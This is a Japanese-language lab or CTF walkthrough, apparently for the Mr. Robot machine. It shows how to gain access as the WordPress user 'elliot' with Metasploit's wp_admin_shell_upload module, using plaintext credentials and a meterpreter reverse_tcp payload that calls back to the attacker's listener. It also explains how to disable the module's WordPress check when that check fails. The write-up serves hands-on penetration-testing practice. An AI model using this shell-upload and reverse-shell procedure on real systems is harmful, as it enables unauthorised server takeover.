# （別方法）elliotユーザーへの侵入のみ記載（あとはやること一緒）

## 1. MetasploitをつかってWordpressの脆弱性を利用する

### モジュールの選択
```text
[msf](Jobs:0 Agents:0) >> use exploit/unix/webapp/wp_admin_shell_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >>
```

### オプション設定
```text
[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> set USERNAME elliot
[!] Unknown datastore option: USERNAME. Did you mean HttpUsername?
USERNAME => elliot

[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> set PASSWORD ER28-0652
[!] Unknown datastore option: PASSWORD. Did you mean HttpPassword?
PASSWORD => ER28-0652

[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> set RHOSTS 192.168.56.114
RHOSTS => 192.168.56.114

[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> set LHOST 192.168.56.101
LHOST => 192.168.56.101
```

### この設定で実行してもエラーをはく
```text
[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> exploit
[*] Started reverse TCP handler on 192.168.56.101:4444
[-] Exploit aborted due to failure: not-found: The target does not appear to be using WordPress
[*] Exploit completed, but no session was created.
```

---

## エラーの意味

> WordpressかどうかをExploitはチェックしているが正常に検出できていない。  
> Wordpressが存在しているかどうかはブラウザですでに確認済み。  
> そこで高度なオプションを用いてExploitの設定からWordpressの検出を無効にする。

---

## 2. 高度なオプションを確認

```text
[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> show advanced options
```

### Module advanced options (exploit/unix/webapp/wp_admin_shell_upload)

| Name | Current Setting | Required | Description |
|------|-----------------|----------|-------------|
| AllowNoCleanup | false | no | Allow exploitation without the possibility of cleaning up files |
| ContextInformationFile |  | no | The information file that contains context information |
| DOMAIN | WORKSTATION | yes | The domain to use for Windows authentication |
| DigestAuthIIS | true | no | Conform to IIS, should work for most servers. Only set to false for non-IIS servers |
| DisablePayloadHandler | false | no | Disable the handler code for the selected payload |
| EnableContextEncoding | false | no | Use transient context when encoding payloads |
| FileDropperDelay |  | no | Delay in seconds before attempting cleanup |
| **FingerprintCheck** | **true** | **no** | **Conduct a pre-exploit fingerprint verification** |
| HttpClientTimeout |  | no | HTTP connection and receive timeout |
| HttpPassword |  | no | The HTTP password to specify for authentication |
| HttpRawHeaders |  | no | Path to ERB-templatized raw headers to append to existing headers |
| HttpTrace | false | no | Show the raw HTTP requests and responses |
| HttpTraceColors | red/blu | no | HTTP request and response colors for HttpTrace (unset to disable) |
| HttpTraceHeadersOnly | false | no | Show HTTP headers only in HttpTrace |
| HttpUsername |  | no | The HTTP username to specify for authentication |
| SSLKeyLogFile |  | no | The SSL key log file |
| SSLServerNameIndication |  | no | SSL/TLS Server Name Indication (SNI) |
| SSLVersion | Auto | yes | Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) |
| UserAgent | Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0 | no | The User-Agent header to use for all requests |
| VERBOSE | false | no | Enable detailed status messages |
| WORKSPACE |  | no | Specify the workspace for this module |
| **WPCHECK** | **false** | **yes** | **Check if the website is a valid WordPress install** |
| WPCONTENTDIR | wp-content | yes | The name of the wp-content directory |
| WfsDelay | 2 | no | Additional delay in seconds to wait for a session |

### Payload advanced options (php/meterpreter/reverse_tcp)

| Name | Current Setting | Required | Description |
|------|-----------------|----------|-------------|
| AutoLoadStdapi | true | yes | Automatically load the Stdapi extension |
| AutoRunScript |  | no | A script to run automatically on session creation |
| AutoSystemInfo | true | yes | Automatically capture system information on initialization |
| AutoUnhookProcess | false | yes | Automatically load the unhook extension and unhook the process |
| AutoVerifySessionTimeout | 30 | no | Timeout period to wait for session validation to occur, in seconds |
| EnableStageEncoding | false | no | Encode the second stage payload |
| EnableUnicodeEncoding | false | yes | Automatically encode UTF-8 strings as hexadecimal |
| HandlerSSLCert |  | no | Path to a SSL certificate in unified PEM format, ignored for HTTP transports |
| InitialAutoRunScript |  | no | An initial script to run on session creation (before AutoRunScript) |
| MeterpreterDebugBuild | false | no | Use a debug version of Meterpreter |
| MeterpreterDebugLogging |  | no | The Meterpreter debug logging configuration |
| PayloadProcessCommandLine |  | no | The displayed command line that will be used by the payload |
| PayloadUUIDName |  | no | A human-friendly name to reference this unique payload (requires tracking) |
| PayloadUUIDRaw |  | no | A hex string representing the raw 8-byte PUID value for the UUID |
| PayloadUUIDSeed |  | no | A string to use when generating the payload UUID (deterministic) |
| PayloadUUIDTracking | false | yes | Whether or not to automatically register generated UUIDs |
| PingbackRetries | 0 | yes | How many additional successful pingbacks |
| PingbackSleep | 30 | yes | Time (in seconds) to sleep between pingbacks |
| ReverseAllowProxy | false | yes | Allow reverse tcp even with Proxies specified |
| ReverseListenerBindAddress |  | no | The specific IP address to bind to on the local system |
| ReverseListenerBindPort |  | no | The port to bind to on the local system if different from LPORT |
| ReverseListenerComm |  | no | The specific communication channel to use for this listener |
| ReverseListenerThreaded | false | yes | Handle every connection in a new thread (experimental) |
| SessionCommunicationTimeout | 300 | no | The number of seconds of no activity before this session should be killed |
| SessionExpirationTimeout | 604800 | no | The number of seconds before this session should be forcibly shut down |
| SessionRetryTotal | 3600 | no | Number of seconds try reconnecting for on network failure |
| SessionRetryWait | 10 | no | Number of seconds to wait between reconnect attempts |
| StageEncoder |  | no | Encoder to use if EnableStageEncoding is set |
| StageEncoderSaveRegisters |  | no | Additional registers to preserve in the staged payload if EnableStageEncoding is set |
| StageEncodingFallback | true | no | Fallback to no encoding if the selected StageEncoder is not compatible |
| StagerRetryCount | 10 | no | The number of times the stager should retry if the first connect fails |
| StagerRetryWait | 5 | no | Number of seconds to wait for the stager between reconnect attempts |
| VERBOSE | false | no | Enable detailed status messages |
| WORKSPACE |  | no | Specify the workspace for this module |

### Module options (exploit/unix/webapp/wp_admin_shell_upload)

| Name | Current Setting | Required | Description |
|------|-----------------|----------|-------------|
| PASSWORD | ER28-0652 | yes | The WordPress password to authenticate with |
| Proxies |  | no | A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, sapni, socks5h, http |
| RHOSTS | 192.168.56.115 | yes | The target host(s) |
| RPORT | 80 | yes | The target port (TCP) |
| SSL | false | no | Negotiate SSL/TLS for outgoing connections |
| TARGETURI | / | yes | The base path to the wordpress application |
| USERNAME | elliot | yes | The WordPress username to authenticate with |
| VHOST |  | no | HTTP server virtual host |

### Payload options (php/meterpreter/reverse_tcp)

| Name | Current Setting | Required | Description |
|------|-----------------|----------|-------------|
| LHOST | 192.168.56.101 | yes | The listen address (an interface may be specified) |
| LPORT | 5555 | yes | The listen port |

### Exploit target

| Id | Name |
|----|------|
| 0 | WordPress |

---

## 3. WPCHECK を無効化して再実行

```text
[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> set wpcheck false
wpcheck => false
```

### この設定でExploitすると
```text
[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> exploit
```

<img width="946" height="547" alt="image" src="https://github.com/user-attachments/assets/cf68f840-5e27-465a-8139-7e4f226e6503" />
